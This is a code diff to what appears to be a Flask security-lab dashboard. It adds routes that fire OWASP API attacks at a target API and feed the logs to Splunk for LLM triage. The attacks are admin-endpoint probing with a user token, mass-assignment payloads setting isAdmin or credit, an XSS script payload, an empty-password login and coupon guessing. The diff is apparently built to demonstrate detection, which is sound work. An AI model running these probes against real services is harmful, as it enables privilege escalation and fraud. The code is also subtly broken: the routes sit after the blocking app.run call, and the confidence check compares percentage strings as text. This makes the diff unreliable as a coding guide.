@@ -84,23 +84,32 @@ def real_triage(attack, count, severity):
             ["ollama", "run", "llama3.2", prompt],
             capture_output=True, text=True, timeout=60
         )
-        cleaned = result.stdout.replace("\x1b", "").strip()
         import re
-        cleaned = re.sub(r'\[\d*[A-Za-z]', '', cleaned)
-        lines = cleaned.split("\n")
+        raw = result.stdout
+        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+        cleaned = ansi_escape.sub('', raw)
+        cleaned = ''.join(c for c in cleaned if ord(c) < 128).strip()
+        lines = cleaned.split('\n')
         parsed = {}
         for line in lines:
-            if "SEVERITY:" in line:
+            if line.startswith("SEVERITY:"):
                 parsed["severity"] = line.split(":",1)[1].strip()
-            elif "CONFIDENCE:" in line:
+            elif line.startswith("CONFIDENCE:"):
                 parsed["confidence"] = line.split(":",1)[1].strip()
-            elif "ACTION:" in line:
+            elif line.startswith("ACTION:"):
                 parsed["action"] = line.split(":",1)[1].strip()
-            elif "ESCALATE:" in line:
+            elif line.startswith("ESCALATE:"):
                 parsed["escalate"] = line.split(":",1)[1].strip()
-        return parsed if parsed else {
+        # Build reasoning from full output minus the structured lines
+        reasoning_lines = [l for l in lines if l and not any(
+            l.startswith(k) for k in ["SEVERITY:","CONFIDENCE:","ACTION:","ESCALATE:"]
+        )]
+        parsed["reasoning"] = " ".join(reasoning_lines).strip() or "AI analysis via Llama 3.2"
+        parsed["fp"] = "Low" if parsed.get("confidence","0%") >= "80%" else "Medium"
+        return parsed if parsed.get("severity") else {
             "severity": severity, "confidence": "70%",
-            "action": "Investigate further", "escalate": "YES"
+            "action": "Investigate further", "escalate": "YES",
+            "reasoning": "Llama 3.2 local analysis", "fp": "Medium"
         }
     except:
         return {
@@ -575,3 +584,203 @@ if __name__ == '__main__':
     print("Running on http://localhost:5000")
     print("=" * 50)
     app.run(host='0.0.0.0', port=5000, debug=False)
+
+@app.route('/attack/objproperty/stream', methods=['GET'])
+def attack_objproperty_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        endpoint = TARGET + "/identity/api/v2/user/dashboard"
+        headers = {"Authorization": "Bearer " + token}
+        sensitive = ["available_credit","video_url","video_name","video_id","role","picture_url"]
+        found = []
+        yield 'data: {"phase":"start","attack":"Obj Property","owasp":"API3:2023"}\n\n'
+        try:
+            r = requests.get(endpoint, headers=headers, timeout=5)
+            log_line = '172.18.0.1 - - "GET /identity/api/v2/user/dashboard HTTP/1.1" ' + str(r.status_code)
+            push_to_splunk(log_line)
+            if r.status_code == 200:
+                data = r.json()
+                for field in sensitive:
+                    if field in data:
+                        found.append(field)
+                        yield f'data: {_json.dumps({"phase":"request","num":len(found),"status":200,"success":len(found),"field":field})}\n\n'
+                        time.sleep(0.5)
+        except Exception as e:
+            yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs "user/dashboard" | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Broken Object Property Level Authorisation", len(found), "MEDIUM")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(found),"exposed":found})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
+
+@app.route('/attack/funcauth/stream', methods=['GET'])
+def attack_funcauth_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        admin_endpoints = [
+            "/identity/api/v2/admin/users",
+            "/identity/api/v2/admin/user/ADMIN_AKASH",
+            "/workshop/api/v2/mechanic",
+            "/workshop/api/v2/admin/mechanic/mechanic_report",
+            "/community/api/v2/admin/post"
+        ]
+        headers = {"Authorization": "Bearer " + token}
+        accessible = []
+        yield 'data: {"phase":"start","attack":"Func Auth","owasp":"API5:2023"}\n\n'
+        for i, ep in enumerate(admin_endpoints):
+            try:
+                r = requests.get(TARGET + ep, headers=headers, timeout=5)
+                log_line = f'172.18.0.1 - - "GET {ep} HTTP/1.1" {r.status_code}'
+                push_to_splunk(log_line)
+                if r.status_code == 200:
+                    accessible.append(ep)
+                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(accessible)})}\n\n'
+                time.sleep(0.4)
+            except Exception as e:
+                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs "admin" | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Broken Function Level Authorisation", len(admin_endpoints), "HIGH")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(accessible),"exposed":accessible})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
+
+@app.route('/attack/misconfiguration/stream', methods=['GET'])
+def attack_misconfiguration_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
+        tests = [
+            {"method":"POST","endpoint":"/identity/api/auth/login","body":{"email":"test@test.com","password":""}},
+            {"method":"GET","endpoint":"/identity/api/v2/user/dashboard","body":None},
+            {"method":"POST","endpoint":"/community/api/v2/community/posts","body":{"title":"<script>alert(1)</script>","content":"xss test"}},
+        ]
+        findings = []
+        yield 'data: {"phase":"start","attack":"Misconfiguration","owasp":"API8:2023"}\n\n'
+        for i, test in enumerate(tests):
+            try:
+                if test["method"] == "POST":
+                    r = requests.post(TARGET + test["endpoint"], json=test["body"], headers=headers, timeout=5)
+                else:
+                    r = requests.get(TARGET + test["endpoint"], headers=headers, timeout=5)
+                log_line = f'172.18.0.1 - - "{test["method"]} {test["endpoint"]} HTTP/1.1" {r.status_code}'
+                push_to_splunk(log_line)
+                if len(r.text) > 100:
+                    findings.append(test["endpoint"])
+                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
+                time.sleep(0.5)
+            except Exception as e:
+                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Security Misconfiguration", len(findings), "MEDIUM")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
+
+@app.route('/attack/inventory/stream', methods=['GET'])
+def attack_inventory_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        headers = {"Authorization": "Bearer " + token}
+        v1_endpoints = [
+            "/identity/api/v1/user/dashboard",
+            "/community/api/v1/community/posts/recent",
+            "/workshop/api/v1/mechanic",
+        ]
+        accessible = []
+        yield 'data: {"phase":"start","attack":"Inventory","owasp":"API9:2023"}\n\n'
+        for i, ep in enumerate(v1_endpoints):
+            try:
+                r = requests.get(TARGET + ep, headers=headers, timeout=5)
+                log_line = f'172.18.0.1 - - "GET {ep} HTTP/1.1" {r.status_code}'
+                push_to_splunk(log_line)
+                if r.status_code == 200:
+                    accessible.append(ep)
+                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(accessible)})}\n\n'
+                time.sleep(0.5)
+            except Exception as e:
+                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs "api/v1" | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Improper Inventory Management", len(v1_endpoints), "MEDIUM")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(accessible),"exposed":accessible})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
+
+@app.route('/attack/massassignment/stream', methods=['GET'])
+def attack_massassignment_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
+        payloads = [
+            {"name":"Akash","number":"1234567890","isAdmin":True},
+            {"name":"Akash","number":"1234567890","role":"admin"},
+            {"name":"Akash","number":"1234567890","available_credit":99999},
+        ]
+        findings = []
+        yield 'data: {"phase":"start","attack":"Mass Assignment","owasp":"API6:2023"}\n\n'
+        for i, payload in enumerate(payloads):
+            try:
+                r = requests.put(TARGET + "/identity/api/v2/user/videos/profile",
+                    json=payload, headers=headers, timeout=5)
+                log_line = f'172.18.0.1 - - "PUT /identity/api/v2/user/videos/profile HTTP/1.1" {r.status_code}'
+                push_to_splunk(log_line)
+                if r.status_code in [200, 201]:
+                    findings.append(list(payload.keys())[-1])
+                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
+                time.sleep(0.5)
+            except Exception as e:
+                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs "PUT" | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Mass Assignment", len(payloads), "HIGH")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
+
+@app.route('/attack/businessflow/stream', methods=['GET'])
+def attack_businessflow_stream():
+    token = request.args.get('token', '') or TOKEN
+    def generate():
+        import time, json as _json
+        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
+        findings = []
+        yield 'data: {"phase":"start","attack":"Business Flow","owasp":"API10:2023"}\n\n'
+        coupons = ["TRAC075","TRACE10","DEMO10","TEST50","FREE100"]
+        for i, coupon in enumerate(coupons):
+            try:
+                r = requests.post(TARGET + "/community/api/v2/coupon/validate-coupon",
+                    json={"coupon_code": coupon}, headers=headers, timeout=5)
+                log_line = f'172.18.0.1 - - "POST /community/api/v2/coupon/validate-coupon HTTP/1.1" {r.status_code}'
+                push_to_splunk(log_line)
+                if r.status_code == 200:
+                    findings.append(coupon)
+                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
+                time.sleep(0.4)
+            except Exception as e:
+                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
+        splunk_results = query_splunk('index=api_logs "coupon" | stats count')
+        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
+        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
+        triage = real_triage("Business Flow Abuse", len(coupons), "HIGH")
+        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
+        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
+    return app.response_class(generate(), mimetype='text/event-stream',
+        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
